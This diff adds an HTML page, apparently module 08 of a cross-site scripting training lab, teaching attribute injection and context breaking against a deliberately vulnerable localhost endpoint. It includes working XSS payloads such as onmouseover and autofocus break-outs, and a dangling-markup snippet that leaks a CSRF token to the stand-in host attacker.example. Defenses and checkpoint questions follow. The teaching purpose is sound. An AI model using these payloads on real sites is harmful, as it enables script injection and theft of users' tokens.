@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Module 08 — Attribute Injection & Context Breaking</title>
+<link rel="stylesheet" href="../assets/lab.css">
+<link rel="stylesheet" href="../module_08_attribute/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../module_07_namespace/">◂ Module 07</a>
+  <a href="../module_09_dom/">Module 09 ▸</a>
+</nav>
+
+<p class="kicker">Module 08 · <span class="mechtag m5">Mechanism 5: Context escape</span> <span class="mechtag m2">→ Mech 2</span></p>
+<h1>Attribute Injection &amp; Context Breaking <span class="badge attack">attack</span></h1>
+<p class="lead">Your input often lands <em>inside</em> an existing tag's
+attribute — not in free HTML. You may not even be able to use
+<code>&lt;</code>. The key that opens this lock is a single quote character.</p>
+
+<h2>The setup: reflection into an attribute value</h2>
+<p>Module 08's <code>/profile</code> endpoint places <code>name</code> here:</p>
+<pre><code>&lt;input name="name" value="<b>YOUR INPUT</b>"&gt;</code></pre>
+<p>You are <em>inside</em> the double-quoted <code>value</code> attribute. To do
+anything, you must first <strong>break out of the attribute</strong> — supply a
+<code>"</code> to end the value, then add your own attribute or tag.</p>
+
+<h2>Break-out ladder (least to most)</h2>
+<table>
+<thead><tr><th>Goal</th><th>Payload for <code>name=</code></th><th>Result</th></tr></thead>
+<tbody>
+<tr><td>Add an event handler, no new tag</td><td><code>" onmouseover="alert(1)</code></td><td>→ <code>&lt;input value="" onmouseover="alert(1)"&gt;</code> — fires on hover, <strong>no <code>&lt;</code> or <code>&gt;</code> used</strong></td></tr>
+<tr><td>Auto-fire, no interaction</td><td><code>" autofocus onfocus="alert(1)</code></td><td>fires on load</td></tr>
+<tr><td>Close the tag, open your own</td><td><code>"&gt;&lt;svg onload=alert(1)&gt;</code></td><td>full tag injection (needs <code>&lt;&gt;</code>)</td></tr>
+</tbody>
+</table>
+<div class="card danger">
+<p>Fire the zero-angle-bracket one against the lab (it triggers when you hover the
+name field):</p>
+<div class="payload">
+  <input id="u1" value='http://localhost:5000/profile?name=" onmouseover="alert(document.domain)'>
+  <button class="copy" data-copy="#u1">copy</button>
+</div>
+<p><a href='http://localhost:5000/profile?name=%22%20onmouseover=%22alert(document.domain)' target="_blank" rel="noopener">▶ open it</a>, then hover the name input. Compare
+<a href='http://localhost:5000/profile-safe?name=%22%20onmouseover=%22alert(document.domain)' target="_blank" rel="noopener">▶ <code>/profile-safe</code></a> — the quote is encoded to <code>&amp;quot;</code> and cannot break out.</p>
+</div>
+
+<h2>Why "no angle brackets" matters</h2>
+<p>Many filters and even some frameworks focus on <code>&lt;</code> and
+<code>&gt;</code>. Attribute break-out with <code>onmouseover</code> uses
+<em>neither</em>. This is the empirical reason the correct fix is
+<strong>context-aware encoding of the quote characters</strong>, not stripping
+angle brackets:</p>
+<ul>
+<li>In a <strong>double-quoted</strong> attribute you must encode <code>"</code>
+(→ <code>&amp;quot;</code>).</li>
+<li>In a <strong>single-quoted</strong> attribute you must encode <code>'</code>.</li>
+<li>In an <strong>unquoted</strong> attribute, <em>whitespace</em> (space, tab,
+newline, <code>/</code>) ends the value — so <code>x onmouseover=alert(1)</code>
+injects a second attribute with no quote at all. This is why "always quote your
+attributes" is a hard rule.</li>
+</ul>
+<pre><code>&lt;!-- unquoted value: a space starts a new attribute --&gt;
+&lt;a href=SEARCH&gt;   with SEARCH = x onmouseover=alert(1)
+   → &lt;a href=x onmouseover=alert(1)&gt;</code></pre>
+
+<h2>Dangling markup: stealing data with <em>no JavaScript</em></h2>
+<p>Sometimes CSP or a filter blocks script execution but you can still inject
+markup into an attribute/tag. <strong>Dangling markup injection</strong> abuses
+the parser's willingness to keep reading an unterminated attribute across the
+rest of the page — sweeping secret content into a URL that the browser then
+fetches, leaking it to an attacker server.</p>
+<pre><code>&lt;!-- Injected at the top of a page that later contains a CSRF token: --&gt;
+&lt;img src="//attacker.example/collect?leak=
+&lt;!-- the browser treats everything up to the NEXT quote as the URL,
+     swallowing the page's HTML (including the token) into the query string,
+     then fetches it — exfiltration with zero script. --&gt;</code></pre>
+<p>Variants use <code>&lt;base href&gt;</code>, an unterminated
+<code>&lt;textarea&gt;</code>/<code>&lt;title&gt;</code>, or a form whose
+<code>action</code> points offsite. The preload scanner (Module 02) can even
+start the fetch <em>during parsing</em>. In the lab, point the
+<code>src</code> at your own <code>callback_server.py</code> from Module 11 to see
+the leak arrive.</p>
+<div class="card">
+<strong>Why this matters for your thesis.</strong> Dangling markup shows that
+"no script executed" is <em>not</em> the same as "no compromise." A defense
+scoped only to script execution (some CSP configurations) can still leak secrets.
+A complete defense must also constrain <em>markup-driven data flows</em>
+(<code>base-uri</code>, <code>form-action</code>, and encoding that prevents
+attribute break-out in the first place).
+</div>
+
+<h2>The defense, precisely</h2>
+<div class="card safe">
+<ol>
+<li><strong>Encode for the attribute context:</strong> at minimum the active
+quote character; robust encoders also handle <code>&lt; &gt; &amp;</code> and
+backtick.</li>
+<li><strong>Always quote attributes</strong> so whitespace can't terminate a
+value.</li>
+<li><strong>CSP <code>base-uri 'none'</code> and <code>form-action</code></strong>
+to blunt dangling-markup exfiltration.</li>
+<li><strong>Prefer frameworks that encode by context automatically</strong> — but
+know their escape hatches (Module 14/17).</li>
+</ol>
+</div>
+
+<h2>Checkpoint</h2>
+<div class="card">
+<ol>
+<li>Write an attribute-context payload that executes with no <code>&lt;</code> or
+<code>&gt;</code> and explain what each character does.</li>
+<li>Why does an unquoted attribute need a different mental model than a quoted
+one?</li>
+<li>Explain how dangling markup exfiltrates a CSRF token without running any
+script, and which CSP directives interfere with it.</li>
+</ol>
+</div>
+
+<footer>
+Module 08 of 19 · <a href="../module_09_dom/">Next: DOM-Based XSS ▸</a><br>
+Endpoints: <code>/profile</code> (vulnerable) vs <code>/profile-safe</code>.
+</footer>
+<script src="../assets/lab.js"></script>
+</body>
+</html>
